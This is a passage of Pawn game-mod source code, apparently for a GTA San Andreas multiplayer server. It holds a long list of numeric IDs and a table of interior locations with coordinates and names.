    29102, 29103, 29104, 29105, 29106, 29107, 29108, 29109, 29110, 29111, 29112, 29113, 29114, 29115, 29116, 29117, 29118, 29119,
    29120, 29121, 29122, 29123, 29124, 29125, 29126, 29127, 29128, 29129, 29130, 29131, 29132, 29133, 29134, 29135, 29136, 29137,
    29138, 29139, 29140, 29141, 29142, 29143, 29144, 29145, 29146, 29147, 29148, 29149, 29150, 29151, 29152, 29153, 29154, 29155,
    29200, 29201, 29202, 29203, 29204, 29205, 29206, 29207, 29208, 29209, 29210, 29211, 29212, 29213, 29214, 29215, 29216, 29217,
    29400, 29401, 29402, 29403, 29404, 29405, 29406, 29407, 29408, 29409, 29410, 29411, 29412, 29413, 29600, 29601, 29602, 29603,
    29604, 29605, 29606, 29607, 29608, 29609, 29610, 29611, 29612, 29613, 29614, 29615, 29616, 29617, 29618, 29619, 29620, 29621,
    29622, 29623, 29624, 29625, 29626, 29627, 29628, 29629, 29630, 29631, 29632, 29633, 29634, 29635, 29636, 29637, 29638, 29639,
    29640, 29641, 29642, 29643, 29644, 29645, 29646, 29647, 29648, 29649, 29650, 29651, 29652, 29653, 29654, 29655, 29656, 29657,
    29658, 29659, 29660, 29661, 29662, 29663, 29664, 29665, 29800, 29801, 29802, 29803, 29804, 29805, 29806, 29807, 29808, 29809,
    29810, 29811, 29812, 29813, 29814, 29815, 29816, 29817, 29818, 29819, 29820, 29821, 29822, 29823, 29824, 29825, 30000, 30001,
    30002, 30003, 30004, 30005, 30006, 30007, 30008, 30009, 30010, 30011, 30012, 30013, 30014, 30015, 30016, 30017, 30018, 30019,
    30020, 30021, 30022, 30023, 30024, 30025, 30026, 30027, 30028, 30029, 30030, 30031, 30032, 30033, 30034, 30035, 30036, 30037,
    30038, 30039, 30040, 30041, 30042, 30043, 30044, 30045, 30046, 30047, 30048, 30049, 30050, 30051, 30052, 30053, 30054, 30055,
    30056, 30057, 30058, 30059, 30060, 30061, 30062, 30063, 30064, 30065, 30066, 30067, 30068, 30069, 30070, 30071, 30072, 30073,
    30074, 30075, 30076, 30077, 30078, 30079, 30080, 30081, 30082, 30200, 30201, 30202, 30203, 30204, 30205, 30206, 30207, 30208,
    30209, 30210, 30211, 30212, 30213, 30214, 30215, 30216, 30217, 30218, 30219, 30220, 30221, 30400, 30401, 30402, 30403, 30404,
    30405, 30406, 30407, 30408, 30409, 30410, 30411, 30412, 30413, 30414, 30415, 30416, 30600, 30800, 30801, 30802, 30803, 31000,
    31001, 31200, 31201, 31202, 31203, 31204, 31205, 31400, 31600, 31601, 31602, 31603, 31604, 31605, 31800, 31801, 31802, 31803,
    31804, 31805, 31806, 31807, 31808, 31809, 31810, 32000, 32200, 32201, 32400, 32401, 32402, 32600, 32800, 32801, 32802, 32803,
    32804, 32805, 32806, 32807, 32808, 32809, 32810, 32811, 32812, 32813, 32814, 32815, 32816, 32817, 32818, 32819, 32820, 32821,
    32822, 32823, 32824, 32825, 32826, 32827, 32828, 32829, 32830, 32831, 32832, 32833, 32834, 32835, 32836, 32837, 32838, 32839,
    32840, 32841, 32842, 32843, 32844, 32845, 32846, 32847, 33000, 33001, 33002, 33003, 33004, 33005, 33006, 33007, 33008, 33009,
    33010, 33011, 33012, 33013, 33014, 33015, 33016, 33017, 33018, 33019, 33020, 33021, 33022, 33023, 33024, 33025, 33026, 33027,
    33028, 33029, 33030, 33031, 33032, 33033, 33034, 33035, 33036, 33037, 33038, 33039, 33040, 33041, 33042, 33043, 33044, 33045,
    33046, 33047, 33048, 33049, 33050, 33051, 33052, 33053, 33054, 33055, 33056, 33057, 33058, 33059, 33060, 33061, 33062, 33063,
    33064, 33065, 33066, 33067, 33068, 33069, 33070, 33071, 33072, 33073, 33074, 33075, 33076, 33077, 33078, 33079, 33080, 33081,
    33082, 33083, 33084, 33085, 33086, 33087, 33088, 33200, 33201, 33202, 33203, 33204, 33205, 33206, 33207, 33208, 33209, 33210,
    33211, 33212, 33213, 33214, 33215, 33216, 33217, 33218, 33219, 33220, 33221, 33222, 33223, 33224, 33225, 33226, 33227, 33228,
    33229, 33230, 33231, 33232, 33233, 33234, 33235, 33236, 33237, 33238, 33239, 33240, 33241, 33242, 33243, 33244, 33245, 33246,
    33247, 33248, 33249, 33250, 33251, 33252, 33253, 33254, 33255, 33256, 33257, 33258, 33259, 33260, 33261, 33262, 33263, 33264,
    33265, 33266, 33267, 33268, 33269, 33270, 33271, 33272, 33273, 33274, 33275, 33276, 33277, 33278, 33279, 33280, 33281, 33282,
    33283, 33284, 33285, 33286, 33287, 33288, 33289, 33290, 33291, 33292, 33293, 33294, 33295, 33296, 33297, 33298, 33299, 33300,
    33301, 33302, 33303, 33304, 33400, 33401, 33402, 33403, 33600, 33601, 33602, 33603, 33604, 33605, 33606, 33607, 33608, 33609,
    33610, 33611, 33612, 33613, 33614, 33615, 33616, 33617, 33618, 33619, 33620, 33621, 33622, 33623, 33624, 33625, 33626, 33627,
    33628, 33629, 33630, 33631, 33632, 33633, 33634, 33635, 33636, 33637, 33638, 33639, 33640, 33641, 33642, 33643, 33644, 33645,
    33646, 33647, 33648, 33649, 33650, 33651, 33652, 33653, 33654, 33655, 33656, 33657, 33658, 33659, 33660, 33661, 33662, 33663,
    33664, 33665, 33666, 33667, 33668, 33669, 33670, 33671, 33672, 33673, 33674, 33675, 33676, 33800, 33801, 33802, 33803, 33804,
    33805, 33806, 33807, 33808, 33809, 33810, 33811, 33812, 33813, 33814, 33815, 33816, 33817, 33818, 33819, 33820, 33821, 33822,
    33823, 33824, 33825, 33826, 33827, 33828, 33829, 33830, 33831, 33832, 33833, 33834, 33835, 33836, 33837, 33838, 33839, 33840,
    33841, 33842, 33843, 33844, 33845, 33846, 33847, 33848, 33849, 33850, 33851, 33852, 33853, 33854, 33855, 33856, 33857, 33858,
    33859, 33860, 33861, 33862, 33863, 33864, 33865, 33866, 33867, 33868, 33869, 33870, 33871, 33872, 33873, 33874, 33875, 33876,
    33877, 33878, 33879, 33880, 33881, 33882, 33883, 33884, 33885, 33886, 33887, 33888, 33889, 34000, 34001, 34002, 34003, 34004,
    34005, 34006, 34007, 34008, 34009, 34010, 34011, 34012, 34013, 34014, 34015, 34016, 34017, 34018, 34019, 34020, 34021, 34022,
    34023, 34024, 34025, 34026, 34027, 34028, 34029, 34030, 34031, 34032, 34033, 34034, 34035, 34036, 34037, 34038, 34039, 34040,
    34041, 34042, 34043, 34044, 34045, 34046, 34047, 34048, 34049, 34050, 34051, 34052, 34053, 34054, 34055, 34056, 34057, 34058,
    34059, 34060, 34061, 34062, 34063, 34064, 34065, 34066, 34067, 34200, 34201, 34202, 34203, 34204, 34205, 34206, 34207, 34208,
    34209, 34210, 34211, 34212, 34213, 34214, 34215, 34216, 34217, 34218, 34219, 34220, 34221, 34222, 34223, 34224, 34225, 34226,
    34227, 34228, 34229, 34230, 34231, 34232, 34233, 34234, 34235, 34236, 34237, 34238, 34239, 34240, 34241, 34242, 34243, 34244,
    34245, 34246, 34247, 34248, 34249, 34250, 34251, 34252, 34253, 34254, 34255, 34256, 34257, 34258, 34259, 34260, 34261, 34262,
    34263, 34264, 34265, 34266, 34267, 34268, 34269, 34270, 34271, 34272, 34273, 34400, 34401, 34402, 34403, 34404, 34405, 34406,
    34407, 34408, 34409, 34410, 34411, 34412, 34413, 34414, 34415, 34600, 34601, 34602, 34603, 34604, 34605, 34606, 34800, 34801,
    34802, 34803, 34804, 34805, 34806, 34807, 34808, 34809, 34810, 34811, 34812, 34813, 34814, 34815, 34816, 34817, 34818, 34819,
    34820, 34821, 34822, 34823, 34824, 34825, 34826, 34827, 34828, 34829, 34830, 34831, 35000, 35001, 35002, 35003, 35004, 35005,
    35006, 35007, 35008, 35009, 35010, 35011, 35012, 35013, 35014, 35015, 35016, 35017, 35018, 35019, 35020, 35021, 35022, 35023,
    35024, 35025, 35026, 35027, 35028, 35029, 35030, 35031, 35032, 35033, 35034, 35035, 35036, 35037, 35038, 35039, 35040, 35041,
    35042, 35043, 35044, 35045, 35046, 35047, 35048, 35049, 35050, 35051, 35052, 35053, 35054, 35055, 35056, 35057, 35058, 35059,
    35060, 35061, 35062, 35063, 35064, 35065, 35066, 35067, 35068, 35069, 35070, 35071, 35072, 35073, 35074, 35075, 35200, 35201,
    35202, 35203, 35204, 35205, 35206, 35207, 35208, 35209, 35210, 35211, 35212, 35213, 35214, 35215, 35216, 35217, 35218, 35219,
    35220, 35221, 35222, 35223, 35224, 35225, 35226, 35227, 35228, 35229, 35230, 35231, 35232, 35233, 35234, 35235, 35236, 35237,
    35238, 35239, 35240, 35400, 35401, 35402, 35403, 35404, 35405, 35406, 35407, 35408, 35409, 35410, 35411, 35412, 35413, 35414,
    35415, 35416, 35417, 35418, 35419, 35420, 35421, 35422, 35423, 35424, 35425, 35426, 35427, 35428, 35429, 35430, 35431, 35432,
    35433, 35434, 35435, 35436, 35437, 35438, 35439, 35440, 35441, 35442, 35443, 35444, 35445, 35446, 35447, 35448, 35449, 35450,
    35451, 35452, 35453, 35454, 35455, 35456, 35457, 35458, 35459, 35460, 35461, 35462, 35463, 35464, 35465, 35466, 35467, 35468,
    35469, 35470, 35471, 35472, 35473, 35474, 35475, 35476, 35477, 35478, 35479, 35480, 35481, 35482, 35483, 35484, 35485, 35486,
    35487, 35488, 35600, 35601, 35602, 35603, 35604, 35605, 35606, 35607, 35608, 35609, 35610, 35611, 35612, 35613, 35614, 35615,
    35616, 35617, 35618, 35619, 35620, 35621, 35622, 35623, 35624, 35625, 35626, 35627, 35628, 35629, 35630, 35631, 35632, 35633,
    35634, 35635, 35636, 35637, 35638, 35639, 35640, 35641, 35642, 35643, 35644, 35645, 35646, 35647, 35648, 35649, 35650, 35651,
    35652, 35653, 35654, 35655, 35656, 35657, 35658, 35659, 35660, 35661, 35662, 35663, 35664, 35665, 35666, 35667, 35668, 35669,
    35670, 35671, 35672, 35673, 35674, 35675, 35676, 35677, 35678, 35679, 35680, 35681, 35682, 35683, 35684, 35685, 35686, 35687,
    35688, 35689, 35690, 35691, 35692, 35693, 35694, 35695, 35696, 35697, 35698, 35699, 35700, 35701, 35702, 35703, 35704, 35705,
    35706, 35707, 35708, 35709, 35710, 35711, 35712, 35713, 35714, 35715, 35716, 35717, 35718, 35719, 35720, 35721, 35722, 35723,
    35724, 35725, 35726, 35727, 35728, 35729, 35730, 35731, 35732, 35733, 35800, 35801, 35802, 35803, 35804, 35805, 35806, 35807,
    35808, 35809, 35810, 35811, 35812, 35813, 35814, 35815, 35816, 35817, 35818, 35819, 35820, 35821, 35822, 35823, 35824, 35825,
    35826, 35827, 35828, 35829, 35830, 35831, 35832, 35833, 35834, 35835, 35836, 35837, 35838, 35839, 35840, 35841, 35842, 35843,
    35844, 35845, 35846, 35847, 35848, 35849, 35850, 35851, 35852, 35853, 35854, 35855, 35856, 35857, 35858, 35859, 35860, 35861,
    35862, 35863, 35864, 35865, 35866, 35867, 35868, 35869, 35870, 35871, 35872, 35873, 35874, 35875, 35876, 35877, 35878, 35879,
    35880, 35881, 35882, 35883, 36000, 36200, 36201, 36202, 36203, 36204, 36205, 36400, 36401, 36600, 36601, 36602, 36603, 36604,
    36800, 36801, 36802, 36803, 36804, 36805, 36806, 36807, 36808, 36809, 36810, 36811, 36812, 36813, 36814, 36815, 36816, 36817,
    36818, 36819, 36820, 36821, 36822, 36823, 36824, 36825, 36826, 36827, 36828, 36829, 36830, 36831, 36832, 36833, 36834, 36835,
    36836, 36837, 36838, 36839, 36840, 36841, 36842, 36843, 36844, 36845, 36846, 36847, 36848, 36849, 36850, 36851, 36852, 36853,
    36854, 36855, 36856, 36857, 36858, 36859, 36860, 37000, 37001, 37002, 37003, 37004, 37005, 37006, 37007, 37008, 37009, 37010,
    37011, 37012, 37013, 37014, 37015, 37016, 37017, 37018, 37019, 37020, 37021, 37022, 37023, 37024, 37025, 37026, 37027, 37028,
    37029, 37030, 37031, 37032, 37033, 37034, 37035, 37200, 37201, 37202, 37203, 37204, 37205, 37206, 37207, 37208, 37209, 37210,
    37211, 37212, 37213, 37214, 37215, 37216, 37217, 37218, 37219, 37220, 37221, 37222, 37223, 37224, 37225, 37226, 37227, 37228,
    37229, 37230, 37231, 37232, 37233, 37234, 37235, 37236, 37237, 37238, 37239, 37240, 37241, 37242, 37243, 37244, 37245, 37400,
    37401, 37402, 37403, 37404, 37405, 37406, 37407, 37408, 37409, 37410, 37411, 37412, 37413, 37414, 37415, 37416, 37417, 37418,
    37419, 37420, 37421, 37422, 37423, 37424, 37425, 37426, 37427, 37428, 37429, 37430, 37431, 37432, 37433, 37434, 37435, 37436,
    37437, 37438, 37439, 37440, 37441, 37442, 37443, 37444, 37445, 37446, 37447, 37448, 37449, 37450, 37451, 37452, 37453, 37454,
    37455, 37456, 37457, 37458, 37459, 37460, 37461, 37462, 37463, 37464, 37465, 37466, 37467, 37468, 37469, 37470, 37471, 37472,
    37473, 37474, 37475, 37476, 37477, 37478, 37479, 37480, 37481, 37482, 37483, 37484, 37485, 37486, 37487, 37488, 37489, 37490,
    37491, 37492, 37493, 37494, 37600, 37601, 37602, 37603, 37604, 37605, 37606, 37607, 37608, 37609, 37610, 37611, 37612, 37613,
    37614, 37615, 37616, 37617, 37618, 37619, 37620, 37621, 37622, 37623, 37624, 37625, 37626, 37627, 37628, 37629, 37630, 37631,
    37632, 37633, 37634, 37635, 37636, 37637, 37638, 37639, 37640, 37641, 37642, 37643, 37644, 37645, 37646, 37647, 37648, 37649,
    37650, 37651, 37652, 37653, 37654, 37655, 37656, 37657, 37658, 37659, 37660, 37661, 37662, 37663, 37664, 37665, 37666, 37667,
    37668, 37669, 37670, 37671, 37672, 37673, 37674, 37675, 37676, 37677, 37678, 37679, 37680, 37681, 37800, 37801, 37802, 37803,
    37804, 37805, 37806, 37807, 37808, 37809, 37810, 37811, 37812, 37813, 37814, 37815, 37816, 37817, 37818, 37819, 37820, 37821,
    37822, 37823, 37824, 37825, 37826, 37827, 37828, 37829, 37830, 37831, 37832, 37833, 37834, 37835, 37836, 37837, 37838, 37839,
    37840, 37841, 37842, 37843, 37844, 37845, 37846, 37847, 37848, 37849, 37850, 37851, 37852, 37853, 37854, 37855, 37856, 37857,
    37858, 37859, 37860, 37861, 37862, 37863, 37864, 37865, 37866, 37867, 37868, 37869, 37870, 37871, 37872, 37873, 38000, 38001,
    38002, 38003, 38004, 38005, 38006, 38007, 38008, 38009, 38010, 38011, 38012, 38013, 38014, 38015, 38016, 38017, 38018, 38019,
    38020, 38021, 38022, 38023, 38024, 38025, 38026, 38027, 38028, 38029, 38030, 38031, 38032, 38033, 38034, 38035, 38036, 38037,
    38038, 38039, 38040, 38041, 38042, 38043, 38044, 38045, 38046, 38047, 38048, 38049, 38050, 38051, 38052, 38053, 38054, 38055,
    38056, 38057, 38058, 38059, 38060, 38200, 38201, 38202, 38203, 38204, 38205, 38206, 38207, 38208, 38209, 38210, 38211, 38212,
    38213, 38214, 38215, 38216, 38217, 38218, 38219, 38220, 38221, 38222, 38223, 38224, 38225, 38226, 38227, 38228, 38229, 38230,
    38231, 38232, 38233, 38234, 38235, 38236, 38237, 38238, 38400, 38401, 38402, 38403, 38404, 38405, 38406, 38407, 38408, 38409,
    38410, 38411, 38412, 38413, 38414, 38415, 38416, 38417, 38418, 38419, 38420, 38421, 38422, 38423, 38424, 38425, 38426, 38427,
    38428, 38429, 38430, 38431, 38432, 38433, 38434, 38435, 38436, 38437, 38438, 38439, 38440, 38441, 38442, 38443, 38444, 38445,
    38446, 38447, 38448, 38449, 38450, 38451, 38452, 38453, 38454, 38455, 38456, 38457, 38458, 38459, 38460, 38461, 38462, 38463,
    38464, 38465, 38466, 38467, 38468, 38469, 38470, 38471, 38600, 38601, 38602, 38603, 38604, 38605, 38606, 38607, 38608, 38609,
    38610, 38611, 38612, 38613, 38614, 38615, 38616, 38617, 38618, 38619, 38620, 38621, 38622, 38623, 38624, 38625, 38626, 38627,
    38628, 38629, 38630, 38631, 38632, 38633, 38634, 38635, 38636, 38637, 38638, 38639, 38640, 38641, 38642, 38643, 38644, 38800,
    38801, 38802, 38803, 38804, 38805, 38806, 38807, 38808, 38809, 38810, 38811, 38812, 38813, 38814, 38815, 38816, 38817, 38818,
    38819, 38820, 38821, 38822, 38823, 38824, 38825, 38826, 38827, 38828, 38829, 38830, 38831, 38832, 38833, 38834, 38835, 38836,
    38837, 38838, 38839, 38840, 38841, 38842, 38843, 38844, 38845, 38846, 38847, 38848, 38849, 38850, 38851, 38852, 38853, 38854,
    39000, 39001, 39002, 39003, 39004, 39005, 39006, 39007, 39008, 39009, 39010, 39011, 39012, 39013, 39014, 39015, 39016, 39017,
    39018, 39019, 39020, 39021, 39022, 39023, 39024, 39025, 39026, 39027, 39028, 39029, 39030, 39031, 39032, 39033, 39034, 39035,
    39036, 39037, 39038, 39039, 39040, 39041, 39042, 39043, 39044, 39045, 39046, 39047, 39048, 39049, 39050, 39051, 39052, 39053,
    39054, 39055, 39056, 39057, 39058, 39059, 39060, 39061, 39062, 39063, 39064, 39065, 39066, 39067, 39068, 39069, 39070, 39071,
    39072, 39073, 39074, 39075, 39076, 39077, 39078, 39200, 39201, 39202, 39203, 39204, 39205, 39206, 39207, 39208, 39209, 39210,
    39211, 39212, 39213, 39214, 39215, 39216, 39217, 39218, 39219, 39220, 39221, 39222, 39223, 39400, 39401, 39402, 39403, 39404,
    39405, 39406, 39407, 39408, 39409, 39410, 39411, 39412, 39413, 39600, 39601, 39602, 39603, 39604, 39605, 39606, 39607, 39608,
    39609, 39610, 39611, 39612, 39613, 39614, 39615, 39616, 39617, 39618, 39619, 39620, 39621, 39622, 39623, 39624, 39625, 39626,
    39627, 39628, 39629, 39630, 39631, 39632, 39633, 39634, 39635, 39636, 39637, 39638, 39639, 39640, 39641, 39642, 39643, 39644,
    39645, 39646, 39647, 39648, 39649, 39650, 39651, 39652, 39653, 39654, 39655, 39656, 39657, 39658, 39659, 39660, 39661, 39662,
    39663, 39664, 39665, 39666, 39667, 39800, 39801, 39802, 39803, 39804, 39805, 39806, 39807, 39808, 39809, 39810, 39811, 39812,
    39813, 39814, 39815, 40000, 40200, 40201, 40202, 40203, 40204, 40205, 40206, 40207, 40208, 40209, 40210, 40211, 40212, 40213,
    40214, 40215, 40216, 40217, 40218, 40219, 40220, 40221, 40222, 40223, 40224, 40225, 40226, 40227, 40228, 40229, 40230, 40231,
    40232, 40233, 40234, 40235, 40236, 40237, 40238, 40400, 40401, 40402, 40403, 40404, 40405, 40406, 40407, 40408, 40600, 40800,
    40801, 40802, 40803, 40804, 40805, 40806, 40807, 40808, 40809, 40810, 40811, 40812, 40813, 40814, 40815, 40816, 40817, 40818,
    40819, 40820, 41000, 41001, 41002, 41003, 41004, 41005, 41006, 41007, 41008, 41009, 41010, 41011, 41012, 41013, 41014, 41015,
    41016, 41017, 41018, 41019, 41020, 41021, 41022, 41023, 41024, 41025, 41026, 41027, 41028, 41029, 41030, 41031, 41032, 41033,
    41034, 41035, 41036, 41037, 41038, 41039, 41040, 41041, 41042, 41200, 41201, 41202, 41203, 41204, 41205, 41206, 41207, 41208,
    41209, 41210, 41211, 41212, 41213, 41214, 41215, 41216, 41217, 41218, 41219, 41220, 41221, 41222, 41223, 41224, 41225, 41226,
    41227, 41228, 41229, 41230, 41231, 41232, 41233, 41234, 41235, 41236, 41237, 41238, 41239, 41240, 41241, 41242, 41243, 41244,
    41245, 41246, 41247, 41248, 41249, 41250, 41251, 41252, 41253, 41254, 41255, 41256, 41257, 41258, 41259, 41260, 41261, 41262,
    41263, 41264, 41265, 41266, 41267, 41268, 41269, 41270, 41271, 41272, 41400, 41401, 41402, 41403, 41404, 41405, 41406, 41407,
    41408, 41409, 41410, 41411, 41412, 41413, 41414, 41415, 41416, 41417, 41418, 41419, 41420, 41421, 41422, 41423, 41424, 41425,
    41426, 41427, 41428, 41429, 41430, 41431, 41432, 41600, 41601, 41602, 41603, 41604, 41800, 42000, 42001, 42002, 42003, 42004,
    42005, 42006, 42007, 42008, 42009, 42010, 42011, 42200, 42201, 42202, 42203, 42204, 42205, 42206, 42207, 42208, 42400, 42401,
    42402, 42403, 42404, 42405, 42406, 42407, 42408, 42409, 42410, 42411, 42412, 42413, 42414, 42415, 42416, 42417, 42418, 42419,
    42420, 42421, 42422, 42423, 42424, 42600, 42601, 42800, 42801, 42802, 42803, 43000, 43001, 43200, 43201, 43202, 43203, 43204,
    43205, 43206, 43400, 43401, 43402, 43403, 43404, 43405, 43406, 43407, 43600, 43601, 43602, 43603, 43604, 43605, 43606, 43607,
    43608, 43609, 43610, 43611, 43612, 43613, 43614, 43615, 43616, 43617, 43618, 43619, 43620, 43621, 43622, 43623, 43624, 43625,
    43626, 43627, 43628, 43629, 43630, 43631, 43632, 43633, 43634, 43635, 43636, 43637, 43638, 43639, 43640, 43641, 43642, 43643,
    43644, 43645, 43646, 43647, 43648, 43649, 43650, 43651, 43652, 43653, 43654, 43655, 43656, 43657, 43658, 43659, 43660, 43661,
    43662, 43663, 43664, 43800, 43801, 43802, 43803, 43804, 43805, 43806, 43807, 43808, 43809, 43810, 43811, 43812, 43813, 43814,
    43815, 43816, 43817, 43818, 43819, 43820, 43821, 43822, 43823, 43824, 43825, 43826, 43827, 43828, 43829, 43830, 43831, 43832,
    43833, 43834, 43835, 43836, 43837, 43838, 43839, 43840, 43841, 43842, 43843, 43844, 43845, 43846, 43847, 43848, 43849, 43850,
    43851, 43852, 43853, 43854, 43855, 43856, 43857, 43858, 43859, 43860, 43861, 43862, 43863, 43864, 43865, 43866, 43867, 43868,
    43869, 43870, 43871, 43872, 43873, 43874, 43875, 43876, 43877, 43878, 43879, 43880, 43881, 43882, 43883, 43884, 43885, 43886,
    43887, 43888, 43889, 43890, 43891, 43892, 43893, 43894, 43895, 43896, 43897, 43898, 43899, 43900, 43901, 43902, 43903, 43904,
    43905, 44000, 44001, 44002, 44003, 44004, 44005, 44006, 44007, 44008, 44009, 44010, 44011, 44012, 44013, 44014, 44015, 44016,
    44017, 44018, 44019, 44020, 44021, 44022, 44023, 44024, 44025, 44026, 44027, 44028, 44029, 44030, 44031, 44032, 44033, 44034,
    44035, 44036, 44037, 44038, 44039, 44040, 44041, 44042, 44043, 44044, 44045, 44046, 44047, 44048, 44049, 44050, 44051, 44052,
    44053, 44054, 44055, 44056, 44057, 44058, 44059, 44060, 44061, 44062, 44063, 44064, 44065, 44066, 44067, 44068, 44069, 44070,
    44071, 44072, 44073, 44074, 44075, 44076, 44077, 44078, 44079, 44080, 44081, 44082, 44083, 44084, 44085, 44086, 44087, 44088,
    44089, 44090, 44091, 44092, 44093, 44094, 44095, 44096, 44097, 44098, 44099, 44100, 44101, 44102, 44103, 44104, 44105, 44106,
    44107, 44200, 44201, 44202, 44203, 44204, 44205, 44206, 44207, 44208, 44209, 44210, 44211, 44212, 44213, 44214, 44215, 44216,
    44217, 44218, 44219, 44220, 44221, 44222, 44223, 44224, 44225, 44226, 44227, 44228, 44229, 44230, 44231, 44232, 44233, 44234,
    44235, 44236, 44237, 44238, 44239, 44240, 44241, 44242, 44243, 44244, 44245, 44246, 44247, 44400, 44401, 44402, 44403, 44404,
    44405, 44406, 44407, 44408, 44409, 44410, 44411, 44412, 44413, 44414, 44415, 44416, 44417, 44418, 44419, 44420, 44421, 44422,
    44423, 44424, 44425, 44426, 44427, 44428, 44429, 44430, 44431, 44432, 44433, 44434, 44435, 44436, 44437, 44438, 44439, 44440,
    44441, 44442, 44443, 44444, 44600, 44601, 44602, 44603, 44604, 44605, 44606, 44607, 44608, 44609, 44610, 44611, 44612, 44613,
    44614, 44615, 44616, 44617, 44618, 44619, 44620, 44621, 44622, 44623, 44624, 44625, 44626, 44627, 44628, 44629, 44630, 44631,
    44800, 44801, 44802, 44803, 44804, 44805, 44806, 44807, 44808, 44809, 44810, 44811, 44812, 44813, 44814, 44815, 44816, 44817,
    44818, 44819, 44820, 45000, 45001, 45002, 45003, 45004, 45005, 45006, 45007, 45008, 45009, 45010, 45011, 45200, 45201, 45202,
    45203, 45204, 45205, 45206, 45207, 45208, 45209, 45210, 45211, 45212, 45213, 45214, 45215, 45216, 45217, 45218, 45219, 45220,
    45221, 45222, 45223, 45224, 45225, 45226, 45227, 45228, 45229, 45230, 45231, 45232, 45233, 45234, 45235, 45236, 45237, 45238,
    45239, 45240, 45241, 45242, 45243, 45244, 45245, 45246, 45247, 45248, 45249, 45250, 45251, 45252, 45253, 45254, 45255, 45400
};

enum intinfo
{
    int_interior,
    Float:int_x,
    Float:int_y,
    Float:int_z,
    Float:int_a,
    int_name[40]
}

new const Interiors[][intinfo] = {
{0,	  0.0,        0.0,        0.0,           0.0,         " "},
{5,   770.8033,   -0.7033,    1000.7267,     22.8599,     "Ganton Gym"},
{3,   974.0177,   -9.5937,    1001.1484,     22.6045,     "Brothel"},
{3,   961.9308,   -51.9071,   1001.1172,     95.5381,     "Brothel2"},
{3,   830.6016,   5.9404,     1004.1797,     125.8149,    "Inside Track Betting"},
{3,   1037.8276,  0.397,      1001.2845,     353.933,     "Blastin' Fools Records"},
{3,   1212.1489,  -28.5388,   1000.9531,     170.5692,    "The Big Spread Ranch"},
{18,  1290.4106,  1.9512,     1001.0201,     179.9419,    "Warehouse 1"},
{1,   1412.1472,  -2.2836,    1000.9241,     114.661,     "Warehouse 2"},
{3,   1527.0468,  -12.0236,   1002.0971,     350.0013,    "B Dup's Apartment"},
{0,   2547.1853,  2824.2493,  10.8203,       262.7038,    "KACC Miltary Warehouse"},
{3,   612.2191,   -123.9028,  997.9922,      266.5704,    "Wheel Arch Angels"},
{3,   512.9291,   -11.6929,   1001.5653,     198.7669,    "OG Loc's House"},
{3,   418.4666,   -80.4595,   1001.8047,     343.2358,    "Barber Shop"},
{3,   386.5259,   173.6381,   1008.3828,     63.7399,     "Planning Department"},
{3,   288.4723,   170.0647,   1007.1794,     22.0477,     "Las Venturas Police Department"},
{3,   206.4627,   -137.7076,  1003.0938,     10.9347,     "Pro-Laps"},
{3,   -100.2674,  -22.9376,   1000.7188,     17.285,      "Sex Shop"},
{3,   -201.2236,  -43.2465,   1002.2734,     45.8613,     "Las Venturas Tattoo parlor"},
{17,  -202.9381,  -6.7006,    1002.2734,     204.2693,    "Lost San Fierro Tattoo parlor"},
{17,  -17.9142,   -173.4321,  1003.5469,     45.1436,     "24/7 (version 1)"},
{5,   454.9853,   -107.2548,  999.4376,      309.0195,    "Diner 1"},
{5,   372.5565,   -131.3607,  1001.4922,     354.2285,    "Pizza Stack"},
{17,  378.026,    -190.5155,  1000.6328,     141.0245,    "Rusty Brown's Donuts"},
{7,   315.244,    -140.8858,  999.6016,      7.4226,      "Ammu-nation"},
{5,   225.0306,   -9.1838,    1002.218,      85.5322,     "Victim"},
{2,   611.3536,   -77.5574,   997.9995,      320.9263,    "Loco Low Co"},
{10,  246.0688,   108.9703,   1003.2188,     0.2922,      "San Fierro Police Department"},
{10,  6.0856,     -28.8966,   1003.5494,     5.0365,      "24/7 (version 2 - large)"},
{7,   773.7318,   -74.6957,   1000.6542,     5.2304,      "Below The Belt Gym (Las Venturas)"},
{1,   621.4528,   -23.7289,   1000.9219,     15.6789,     "Transfenders"},
{1,  445.6003,   -6.9823,    1000.7344,     172.2105,     "World of Coq"},
{1,   285.8361,   -39.0166,   1001.5156,     0.7529,      "Ammu-nation (version 2)"},
{1,   204.1174,   -46.8047,   1001.8047,     357.5777,    "SubUrban"},
{1,   245.2307,   304.7632,   999.1484,      273.4364,    "Denise's Bedroom"},
{3,   290.623,    309.0622,   999.1484,      89.9164,     "Helena's Barn"},
{5,   322.5014,   303.6906,   999.1484,      8.1747,      "Barbara's Love nest"},
{1,   -2041.2334, 178.3969,   28.8465,       156.2153,    "San Fierro Garage"},
{1,   -1402.6613, 106.3897,   1032.2734,     105.1356,    "Oval Stadium"},
{7,   -1403.0116, -250.4526,  1043.5341,     355.8576,    "8-Track Stadium"},
{2,   1207.5087,  3.6289,     1000.9219,     214.6596,    "The Pig Pen (strip club 2)"},
{10,  2016.1156,  1017.1541,  996.875,       88.0055,     "Four Dragons"},
{1,   -741.8495,  493.0036,   1371.9766,     71.7782,     "Liberty City"},
{2,   2447.8704,  -1704.4509, 1013.5078,     314.5253,    "Ryder's house"},
{1,   2527.0176,  -1679.2076, 1015.4986,     260.9709,    "Sweet's House"},
{10,  -1129.8909, 1057.5424,  1346.4141,     274.5268,    "RC Battlefield"},
{3,   2496.0549,  -1695.1749, 1014.7422,     179.2174,    "The Johnson House"},
{10,  366.0248,   -73.3478,   1001.5078,     292.0084,    "Burger shot"},
{1,   2233.9363,  1711.8038,  1011.6312,     184.3891,    "Caligula's Casino"},
{2,   269.6405,   305.9512,   999.1484,      215.6625,    "Katie's Lovenest"},
{2,   414.2987,   -18.8044,   1001.8047,     41.4265,     "Barber Shop 2 (Reece's)"},
{2,   1.1853,     -3.2387,    999.4284,      87.5718,     "Angel Pine Trailer"},
{18,  -30.9875,   -89.6806,   1003.5469,     359.8401,    "24/7 (version 3)"},
{18,  161.4048,   -94.2416,   1001.8047,     0.7938,      "Zip"},
{3,   -2638.8232, 1407.3395,  906.4609,      94.6794,     "The Pleasure Domes"},
{5,   1267.8407,  -776.9587,  1091.9063,     231.3418,    "Madd Dogg's Mansion"},
{2,   2536.5322,  -1294.8425, 1044.125,      254.9548,    "Big Smoke's Crack Palace"},
{5,   2350.1597,  -1181.0658, 1027.9766,     99.1864,     "Burning Desire Building"},
{1,   -2158.6731, 642.09,     1052.375,      86.5402,     "Wu-Zi Mu's"},
{10,  419.8936,   2537.1155,  10.0000,       67.6537,     "Abandoned AC tower"},
{14,  256.9047,   -41.6537,   1002.0234,     85.8774,     "Wardrobe/Changing room"},
